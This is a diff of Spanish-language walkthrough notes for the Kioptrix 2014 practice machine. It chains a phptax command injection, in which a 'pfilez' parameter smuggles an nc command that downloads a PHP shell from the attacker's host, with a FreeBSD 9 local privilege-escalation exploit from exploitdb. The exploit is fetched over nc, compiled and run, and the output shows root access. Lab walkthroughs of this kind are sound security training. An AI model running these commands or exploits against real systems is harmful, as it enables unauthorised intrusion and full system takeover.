@@ -15,5 +15,20 @@ Por arte de magia, tras no saber qué hacer, leo de un writeup que hay que usar 
 cp phpshell.php /var/www/html
 service apache2 start
 /phptax/index.php?pfilez=1040d1-pg2.tob;nc 192.168.111.128 80 < get.txt > shell.php
+uname -a
+  FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE
 
+searchsploit freebsd 9
+cp /usr/share/exploitdb/exploits/freebsd/local/28718.c ./
+cp 28718.c /var/www/html/exploit.c
+printf "GET http://192.168.111.128/exploit.c HTTP/1.0\r\n\r\n" > get.txt
+nc 192.168.111.128 80 < get.txt > exploit.c
 
+El archivo exploit.c viene con algunas líneas de nc, así que las contamos (hay 9) y nos quedamos solamente con la parte del archivo que nos interesa
+  wc -l exploit.c
+     187 exploit.c
+  tail -178 exploit.c > exploit2.c
+  gcc -o exploit exploit2.c
+  ./exploit
+  id
+    uid=0(root) gid=0(wheel) groups=0(wheel)
